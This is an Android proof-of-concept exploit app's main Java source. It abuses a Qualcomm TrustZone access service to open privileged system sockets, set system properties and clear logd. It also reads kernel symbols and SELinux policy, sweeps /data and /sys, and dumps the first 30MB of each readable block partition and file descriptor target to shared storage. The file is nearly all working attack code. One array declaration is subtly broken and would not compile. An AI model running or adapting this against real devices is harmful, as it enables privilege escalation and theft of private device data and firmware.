package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private static final int ERROR_UNAVAIL = -96;
    private static final int ERROR_BADOBJ = -92;
    private static final int ERROR_DEFUNCT = -90;

    private static final int PROP_SUCCESS = 0;
    private static final int PROP_ERROR_INVALID_NAME = 1;
    private static final int PROP_ERROR_INVALID_VALUE = 2;
    private static final int PROP_ERROR_PERMISSION_DENIED = 3;
    private static final int PROP_ERROR_READ_ONLY_PROPERTY = 4;
    private static final int PROP_ERROR_SET_FAILED = 5;
    private static final int PROP_ERROR_HANDLE_CONTROL_MESSAGE = 6;
    private static final int PROP_ERROR_READ_CMD = 7;
    private static final int PROP_ERROR_READ_DATA = 8;
    private static final int PROP_ERROR_INVALID_CMD = 9;

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native String[] nativeListDir(String path);
    public static native String nativeReadFile(String path);
    public static native String nativeWriteFile(String path, String content);
    public static native String nativeReadLink(String path);
    public static native String nativeTestFd(int fd);
    public static native int nativeOpenDevice(String path);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound via AIDL");
                updateStatus("Bound - starting exploit");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast to IMinkSocketFd");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== TZ Socket & Proc POC ==========");

        // 1. Socket tests (dnsproxyd, fwmarkd, logd)
        String[] targetSockets = {
                "/dev/socket/dnsproxyd",
                "/dev/socket/fwmarkd",
                "/dev/socket/logd"
        };
        for (String path : targetSockets) {
            if (stopRequested.get()) break;
            appendLog("[+] Testing " + path);
            try {
                testSocket(path);
            } catch (Exception e) {
                appendLog("[!] Error testing " + path + ": " + e.getMessage());
            }
        }

        // 2. property_service deep test (AOSP 9 protocol)
        appendLog("[*] Deep property service testing (AOSP 9 protocol)");
        testPropertyServiceDeep();

        // 3. /proc/self/fd exploration and dumping (up to 30MB)
        appendLog("[*] Exploring and dumping /proc/self/fd to /sdcard/Download");
        exploreAndDumpProcFd();

        // 4. oom_score_adj multi-angle verification
        appendLog("[*] Testing /proc/self/oom_score_adj");
        testOomScoreAdj();

        // 5. SELinux and kptr related files readability
        appendLog("[*] Testing SELinux and kptr related files");
        exploreSelinuxAndKptr();

        // 6. Bruteforce /sys for readable files (enhanced)
        appendLog("[*] Bruteforcing /sys for readable files");
        bruteforceSys();

        // 7. Bruteforce /dev/block (all partitions)
        appendLog("[*] Bruteforcing /dev/block for readable partitions (30MB dump)");
        bruteforceBlock();

        // 8. Bruteforce /data for copyable files (depth limited)
        appendLog("[*] Bruteforcing /data for copyable files (depth limited)");
        bruteforceData();

        // 9. Direct device open test (ion, hwbinder)
        appendLog("[*] Testing direct open of /dev/ion");
        int ionFd = nativeOpenDevice("/dev/ion");
        appendLog("[DEV] /dev/ion open returned fd=" + ionFd);
        if (ionFd >= 0) {
            String info = nativeTestFd(ionFd);
            appendLog("[DEV] /dev/ion fd info: " + info);
        }

        appendLog("[*] Testing direct open of /dev/hwbinder");
        int hwbinderFd = nativeOpenDevice("/dev/hwbinder");
        appendLog("[DEV] /dev/hwbinder open returned fd=" + hwbinderFd);
        if (hwbinderFd >= 0) {
            String info = nativeTestFd(hwbinderFd);
            appendLog("[DEV] /dev/hwbinder fd info: " + info);
        }

        appendLog("========== EXPLOIT COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    // ===== Socket test (unchanged) =====
    private void testSocket(String path) {
        ParcelFileDescriptor pfd = null;
        try {
            int[] handle = new int[1];
            pfd = openSocket(path, handle);
            if (pfd == null) {
                appendLog("[ ] Failed to open " + path + " (handle=" + (handle.length>0?handle[0]:"null") + ")");
                return;
            }
            FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) {
                appendLog("[ ] Invalid FD for " + path);
                pfd.close();
                return;
            }
            appendLog("[+] Opened " + path + " (handle=" + handle[0] + ")");
            if (handle[0] < 0) {
                appendLog("[!] Service returned error: " + handle[0]);
                pfd.close();
                return;
            }

            String fdInfo = nativeTestFd(pfd.getFd());
            appendLog("[FD] " + fdInfo);

            String base = new File(path).getName();
            switch (base) {
                case "dnsproxyd": testDnsProxy(fd); break;
                case "fwmarkd": testFwmarkd(fd); break;
                case "logd": testLogd(fd); break;
                default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n"});
            }
            pfd.close();
        } catch (Exception e) {
            appendLog("[!] Exception testing " + path + ": " + e.getMessage());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private ParcelFileDescriptor openSocket(String path, int[] handle) {
        if (tzService == null) return null;
        try {
            return tzService.a(path, handle);
        } catch (RemoteException e) {
            appendLog("[!] RemoteException: " + e.getMessage());
            return null;
        }
    }

    private void testDnsProxy(FileDescriptor fd) {
        try {
            byte[] query = buildDnsQuery("localhost", 1);
            byte[] resp = sendBinary(fd, query, 512, 2000);
            if (resp != null && resp.length > 0) {
                int rcode = resp[3] & 0x0F;
                appendLog("[DNS] Response len=" + resp.length + ", RCODE=" + rcode);
            } else {
                appendLog("[DNS] No response");
            }
        } catch (Exception e) {
            appendLog("[DNS] Error: " + e.getMessage());
        }
    }

    private void testFwmarkd(FileDescriptor fd) {
        try {
            ByteBuffer buf = ByteBuffer.allocate(16);
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(6);
            buf.putInt(android.os.Process.myUid());
            buf.putInt(0);
            buf.putInt(0);
            byte[] resp = sendBinary(fd, buf.array(), 4, 1000);
            if (resp != null && resp.length == 4) {
                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
                appendLog("[FW] SELECT_NETWORK result=" + result);
            } else {
                appendLog("[FW] No/invalid response");
            }
        } catch (Exception e) { appendLog("[FW] Error: " + e.getMessage()); }

        try {
            ByteBuffer buf = ByteBuffer.allocate(12);
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(7);
            buf.putInt(android.os.Process.myUid());
            buf.putInt(0);
            byte[] resp = sendBinary(fd, buf.array(), 8, 1000);
            if (resp != null && resp.length >= 4) {
                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
                appendLog("[FW] GET_NETWORK result=" + result);
            } else {
                appendLog("[FW] No response for GET_NETWORK");
            }
        } catch (Exception e) { appendLog("[FW] GET_NETWORK error: " + e.getMessage()); }
    }

    private void testLogd(FileDescriptor fd) {
        try {
            InputStream is = new FileInputStream(fd);
            byte[] buf = new byte[4096];
            int read = readBytes(is, buf, 4096, 1000);
            if (read > 0) {
                String str = new String(buf, 0, read, StandardCharsets.UTF_8);
                appendLog("[LOGD] Read " + read + " bytes: " + str.replace("\n", "\\n"));
            } else {
                appendLog("[LOGD] No data");
            }
            is.close();
        } catch (Exception e) { appendLog("[LOGD] Error: " + e.getMessage()); }

        try {
            String resp = sendTextCommand(fd, "clear\n", 500);
            appendLog("[LOGD] clear response: " + (resp != null ? resp : "(none)"));
        } catch (Exception e) { appendLog("[LOGD] clear error: " + e.getMessage()); }
    }

    private void testGeneric(FileDescriptor fd, String[] cmds) {
        for (String cmd : cmds) {
            if (stopRequested.get()) break;
            try {
                String resp = sendTextCommand(fd, cmd, 1000);
                appendLog("[GEN] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
            } catch (Exception e) { appendLog("[GEN] Error on " + cmd.trim() + ": " + e.getMessage()); }
        }
    }

    private String sendTextCommand(FileDescriptor fd, String cmd, int timeoutMs) throws Exception {
        OutputStream os = null;
        InputStream is = null;
        try {
            os = new FileOutputStream(fd);
            os.write(cmd.getBytes(StandardCharsets.UTF_8));
            os.flush(); os.close(); os = null;
            is = new FileInputStream(fd);
            byte[] buf = new byte[4096];
            int read = readBytes(is, buf, 4096, timeoutMs);
            if (read > 0) return new String(buf, 0, read, StandardCharsets.UTF_8);
            return null;
        } finally {
            if (os != null) try { os.close(); } catch (Exception ignored) {}
            if (is != null) try { is.close(); } catch (Exception ignored) {}
        }
    }

    private byte[] sendBinary(FileDescriptor fd, byte[] data, int maxResp, int timeoutMs) throws Exception {
        OutputStream os = null;
        InputStream is = null;
        try {
            os = new FileOutputStream(fd);
            os.write(data); os.flush(); os.close(); os = null;
            is = new FileInputStream(fd);
            byte[] buf = new byte[maxResp];
            int read = readBytes(is, buf, maxResp, timeoutMs);
            if (read > 0) {
                byte[] resp = new byte[read];
                System.arraycopy(buf, 0, resp, 0, read);
                return resp;
            }
            return null;
        } finally {
            if (os != null) try { os.close(); } catch (Exception ignored) {}
            if (is != null) try { is.close(); } catch (Exception ignored) {}
        }
    }

    private int readBytes(InputStream is, byte[] buffer, int maxLen, int timeoutMs) {
        int total = 0;
        long start = System.currentTimeMillis();
        try {
            while (total < maxLen && System.currentTimeMillis() - start < timeoutMs) {
                if (is.available() > 0) {
                    int n = is.read(buffer, total, maxLen - total);
                    if (n <= 0) break;
                    total += n;
                } else {
                    Thread.sleep(20);
                }
            }
            return total;
        } catch (Exception e) { return -1; }
    }

    private byte[] buildDnsQuery(String name, int qtype) throws Exception {
        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
        baos.write(0x12); baos.write(0x34);
        baos.write(0x01); baos.write(0x00);
        baos.write(0x00); baos.write(0x01);
        baos.write(0x00); baos.write(0x00);
        baos.write(0x00); baos.write(0x00);
        baos.write(0x00); baos.write(0x00);
        for (String label : name.split("\\.")) {
            baos.write(label.length());
            baos.write(label.getBytes(StandardCharsets.US_ASCII));
        }
        baos.write(0);
        baos.write((qtype >> 8) & 0xFF); baos.write(qtype & 0xFF);
        baos.write(0x00); baos.write(0x01);
        return baos.toByteArray();
    }

    // ===== Property Service (AOSP 9) =====
    private void testPropertyServiceDeep() {
        ParcelFileDescriptor pfd = null;
        try {
            int[] handle = new int[1];
            pfd = openSocket("/dev/socket/property_service", handle);
            if (pfd == null) {
                appendLog("[PROP] Failed to open property_service for deep test");
                return;
            }
            FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) {
                appendLog("[PROP] Invalid FD");
                pfd.close();
                return;
            }

            String[][] tests = {
                    {"persist.test.poc", "1"},
                    {"persist.test.poc", "2"},
                    {"test.prop", "value"},
                    {"persist.test.long", "a".repeat(150)} // > 92 chars should fail
            };

            for (String[] test : tests) {
                if (stopRequested.get()) break;
                String name = test[0];
                String value = test[1];
                int result = sendPropertySet2(fd, name, value);
                appendLog("[PROP] Set " + name + "=" + value + " => result: " + result + " (" + getPropertyErrorString(result) + ")");
            }

            int oldResult = sendPropertySet1(fd, "persist.test.old", "1");
            appendLog("[PROP] Old format set persist.test.old=1 => result: " + oldResult);

            pfd.close();
        } catch (Exception e) {
            appendLog("[PROP] Deep test error: " + e.getMessage());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private int sendPropertySet2(FileDescriptor fd, String name, String value) {
        try {
            ByteBuffer buf = ByteBuffer.allocate(4 + 4 + name.length() + 4 + value.length());
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(2); // PROP_MSG_SETPROP2
            buf.putInt(name.length());
            buf.put(name.getBytes(StandardCharsets.UTF_8));
            buf.putInt(value.length());
            buf.put(value.getBytes(StandardCharsets.UTF_8));
            byte[] data = buf.array();
            OutputStream os = new FileOutputStream(fd);
            os.write(data);
            os.flush();
            os.close();

            InputStream is = new FileInputStream(fd);
            byte[] resp = new byte[4];
            int read = readBytes(is, resp, 4, 1000);
            is.close();
            if (read == 4) {
                return ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
            }
            return -1;
        } catch (Exception e) {
            appendLog("[PROP] sendPropertySet2 exception: " + e.getMessage());
            return -2;
        }
    }

    private int sendPropertySet1(FileDescriptor fd, String name, String value) {
        try {
            ByteBuffer buf = ByteBuffer.allocate(4 + 32 + 92);
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(1);
            byte[] nameBytes = name.getBytes(StandardCharsets.UTF_8);
            byte[] valueBytes = value.getBytes(StandardCharsets.UTF_8);
            buf.put(nameBytes);
            for (int i = nameBytes.length; i < 32; i++) buf.put((byte)0);
            buf.put(valueBytes);
            for (int i = valueBytes.length; i < 92; i++) buf.put((byte)0);
            byte[] data = buf.array();
            OutputStream os = new FileOutputStream(fd);
            os.write(data);
            os.flush();
            os.close();

            InputStream is = new FileInputStream(fd);
            byte[] resp = new byte[4];
            int read = readBytes(is, resp, 4, 500);
            is.close();
            if (read == 4) return ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
            return 0;
        } catch (Exception e) {
            appendLog("[PROP] sendPropertySet1 exception: " + e.getMessage());
            return -2;
        }
    }

    private String getPropertyErrorString(int code) {
        switch(code) {
            case PROP_SUCCESS: return "SUCCESS";
            case PROP_ERROR_INVALID_NAME: return "INVALID_NAME";
            case PROP_ERROR_INVALID_VALUE: return "INVALID_VALUE";
            case PROP_ERROR_PERMISSION_DENIED: return "PERMISSION_DENIED";
            case PROP_ERROR_READ_ONLY_PROPERTY: return "READ_ONLY_PROPERTY";
            case PROP_ERROR_SET_FAILED: return "SET_FAILED";
            case PROP_ERROR_HANDLE_CONTROL_MESSAGE: return "HANDLE_CONTROL_MESSAGE";
            case PROP_ERROR_READ_CMD: return "READ_CMD";
            case PROP_ERROR_READ_DATA: return "READ_DATA";
            case PROP_ERROR_INVALID_CMD: return "INVALID_CMD";
            default: return "UNKNOWN (" + code + ")";
        }
    }

    // ===== Proc FD Exploration & Dumping =====
    private void exploreAndDumpProcFd() {
        File dumpDir = getDumpDir();
        if (dumpDir == null) {
            appendLog("[DUMP] Cannot get dump directory");
            return;
        }
        String[] fds = nativeListDir("/proc/self/fd");
        if (fds == null) {
            appendLog("[PROC] Could not read fd directory");
            return;
        }

        int maxDumpSize = 30 * 1024 * 1024; // 30MB

        for (String fdStr : fds) {
            if (stopRequested.get()) break;
            String link = "/proc/self/fd/" + fdStr;
            String target = nativeReadLink(link);
            if (target == null) continue;

            appendLog("[PROC] " + link + " -> " + target);

            if (!target.startsWith("pipe:") && !target.startsWith("socket:") && !target.startsWith("anon_inode:")) {
                String content = nativeReadFile(link);
                if (content != null && !content.isEmpty()) {
                    appendLog("[PROC] " + link + " content (first 100): " + content.substring(0, Math.min(100, content.length())));
                }
                String fileName = "fd_" + fdStr + "_" + new File(target).getName() + ".bin";
                File outFile = new File(dumpDir, fileName);
                boolean dumped = dumpFileToDownload(link, outFile, maxDumpSize);
                if (dumped) {
                    appendLog("[DUMP] Dumped " + link + " to " + outFile.getAbsolutePath());
                } else {
                    appendLog("[DUMP] Failed to dump " + link);
                }
            }
        }
    }

    private boolean dumpFileToDownload(String sourcePath, File destFile, int maxSize) {
        FileInputStream fis = null;
        FileOutputStream fos = null;
        try {
            fis = new FileInputStream(sourcePath);
            fos = new FileOutputStream(destFile);
            byte[] buffer = new byte[65536];
            int totalRead = 0;
            int read;
            while (totalRead < maxSize && (read = fis.read(buffer)) != -1) {
                fos.write(buffer, 0, read);
                totalRead += read;
            }
            return true;
        } catch (Exception e) {
            return false;
        } finally {
            try { if (fis != null) fis.close(); } catch (Exception ignored) {}
            try { if (fos != null) fos.close(); } catch (Exception ignored) {}
        }
    }

    private File getDumpDir() {
        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dir != null && (dir.exists() || dir.mkdirs())) return dir;
        }
        return getFilesDir();
    }

    // ===== oom_score_adj multi-angle =====
    private void testOomScoreAdj() {
        String path = "/proc/self/oom_score_adj";
        String current = nativeReadFile(path);
        appendLog("[OOM] Current oom_score_adj: " + (current != null ? current.trim() : "null"));

        int[] values = {-1000, -500, 0, 500, 1000, 200, 300};
        for (int v : values) {
            if (stopRequested.get()) break;
            String result = nativeWriteFile(path, String.valueOf(v));
            if ("OK".equals(result)) {
                String newVal = nativeReadFile(path);
                appendLog("[OOM] Set to " + v + ", read back: " + (newVal != null ? newVal.trim() : "null"));
            } else {
                appendLog("[OOM] Failed to set " + v + ": " + result);
            }
        }
    }

    // ===== SELinux and kptr =====
    private void exploreSelinuxAndKptr() {
        String[] paths = {
                "/proc/kallsyms",
                "/proc/kptr_restrict",
                "/proc/self/attr/current",
                "/proc/self/attr/prev",
                "/proc/self/attr/keycreate",
                "/proc/self/attr/exec",
                "/proc/self/attr/fscreate",
                "/sys/kernel/security/",
                "/sys/fs/selinux/policy",
                "/sys/fs/selinux/status",
                "/sys/fs/selinux/booleans/",
                "/sys/fs/selinux/enforce",
                "/sys/fs/selinux/load",
                "/sys/kernel/debug/kptr_restrict",
                "/sys/kernel/security/lsm"
        };
        for (String p : paths) {
            if (stopRequested.get()) break;
            File f = new File(p);
            String result;
            if (f.isDirectory()) {
                String[] children = nativeListDir(p);
                if (children != null) {
                    appendLog("[SELINUX] " + p + " (dir) entries: " + children.length + " files");
                    for (String child : children) {
                        if (stopRequested.get()) break;
                        String childPath = p + (p.endsWith("/") ? "" : "/") + child;
                        String content = safeReadFile(childPath);
                        if (content != null && !content.isEmpty()) {
                            appendLog("[SELINUX] " + childPath + " = " + content.substring(0, Math.min(100, content.length())));
                        }
                    }
                } else {
                    appendLog("[SELINUX] " + p + " (dir) unreadable");
                }
            } else {
                String content = safeReadFile(p);
                if (content != null) {
                    appendLog("[SELINUX] " + p + " = " + content.substring(0, Math.min(100, content.length())));
                } else {
                    appendLog("[SELINUX] " + p + " (unreadable)");
                }
            }
        }
    }

    private String safeReadFile(String path) {
        try {
            return nativeReadFile(path);
        } catch (Exception e) {
            return null;
        }
    }

    // ===== Bruteforce /sys (enhanced) =====
    private void bruteforceSys() {
        String[] bases = {
                "/sys/class/power_supply/battery/",
                "/sys/devices/system/cpu/cpu0/cpufreq/",
                "/sys/kernel/debug/",
                "/sys/fs/",
                "/sys/class/",
                "/sys/devices/"
        };
        for (String base : bases) {
            if (stopRequested.get()) break;
            File dir = new File(base);
            if (!dir.exists()) continue;
            List<File> files = listFilesRecursive(dir, 0, 2);
            for (File f : files) {
                if (stopRequested.get()) break;
                if (f.isFile() && f.canRead()) {
                    try {
                        String content = nativeReadFile(f.getAbsolutePath());
                        if (content != null && !content.isEmpty()) {
                            appendLog("[SYS] " + f.getAbsolutePath() + " = " + content.substring(0, Math.min(100, content.length())));
                        } else {
                            appendLog("[SYS] " + f.getAbsolutePath() + " (empty/unreadable)");
                        }
                    } catch (Exception e) {
                        // ignore
                    }
                }
            }
        }
    }

    // ===== Bruteforce /dev/block (all partitions) =====
    private void bruteforceBlock() {
        File dumpDir = getDumpDir();
        if (dumpDir == null) return;

        // mmcblk0p1~p30, mmcblk1p1~p16, sda1~sda16, dm-0~dm-15, loop0~loop15
        String[] patterns = {
                "mmcblk0p", 1, 30,
                "mmcblk1p", 1, 16,
                "sda", 1, 16,
                "sdb", 1, 16,
                "dm-", 0, 15,
                "loop", 0, 15
        };
        // We'll implement loops programmatically.
        for (int i = 1; i <= 30; i++) {
            String path = "/dev/block/mmcblk0p" + i;
            tryDumpBlock(path, dumpDir);
        }
        for (int i = 1; i <= 16; i++) {
            String path = "/dev/block/mmcblk1p" + i;
            tryDumpBlock(path, dumpDir);
        }
        for (int i = 1; i <= 16; i++) {
            String path = "/dev/block/sda" + i;
            tryDumpBlock(path, dumpDir);
            path = "/dev/block/sdb" + i;
            tryDumpBlock(path, dumpDir);
        }
        for (int i = 0; i <= 15; i++) {
            String path = "/dev/block/dm-" + i;
            tryDumpBlock(path, dumpDir);
            path = "/dev/block/loop" + i;
            tryDumpBlock(path, dumpDir);
        }
        // Also try /dev/block/by-name/* symlinks
        File byName = new File("/dev/block/by-name/");
        if (byName.exists() && byName.isDirectory()) {
            String[] links = byName.list();
            if (links != null) {
                for (String link : links) {
                    if (stopRequested.get()) break;
                    String path = "/dev/block/by-name/" + link;
                    String target = nativeReadLink(path);
                    if (target != null) {
                        String realPath = "/dev/block/" + target;
                        tryDumpBlock(realPath, dumpDir);
                    }
                }
            }
        }
    }

    private void tryDumpBlock(String path, File dumpDir) {
        if (stopRequested.get()) return;
        File f = new File(path);
        if (f.exists() && f.canRead()) {
            appendLog("[BLK] Found " + path + ", size=" + f.length());
            String fileName = new File(path).getName() + ".bin";
            File out = new File(dumpDir, fileName);
            if (dumpFileToDownload(path, out, 30 * 1024 * 1024)) {
                appendLog("[BLK] Dumped first 30MB of " + path + " to " + out.getAbsolutePath());
            } else {
                appendLog("[BLK] Failed to dump " + path);
            }
        }
    }

    // ===== Bruteforce /data (enhanced) =====
    private void bruteforceData() {
        String[] bases = {
                "/data/local/tmp/",
                "/data/data/",
                "/data/misc/",
                "/data/system/",
                "/data/apex/",
                "/data/vendor/",
                "/data/user/0/"
        };
        for (String base : bases) {
            if (stopRequested.get()) break;
            File dir = new File(base);
            if (!dir.exists()) continue;
            List<File> files = listFilesRecursive(dir, 0, 3); // depth 3 to avoid excessive recursion
            for (File f : files) {
                if (stopRequested.get()) break;
                if (f.isFile() && f.canRead()) {
                    try {
                        String content = nativeReadFile(f.getAbsolutePath());
                        if (content != null && !content.isEmpty()) {
                            appendLog("[DATA] " + f.getAbsolutePath() + " = " + content.substring(0, Math.min(100, content.length())));
                        }
                    } catch (Exception e) {
                        // ignore
                    }
                }
            }
        }
    }

    private List<File> listFilesRecursive(File dir, int depth, int maxDepth) {
        List<File> result = new ArrayList<>();
        if (depth > maxDepth) return result;
        if (dir == null || !dir.exists()) return result;
        File[] children = dir.listFiles();
        if (children == null) return result;
        for (File child : children) {
            if (stopRequested.get()) break;
            try {
                if (child.isDirectory()) {
                    result.addAll(listFilesRecursive(child, depth + 1, maxDepth));
                } else {
                    result.add(child);
                }
            } catch (Exception ignored) {}
        }
        return result;
    }

    // ===== Utils =====
    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = getDumpDir();
            File file = new File(dir, "tz_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZ POC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Exploit completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
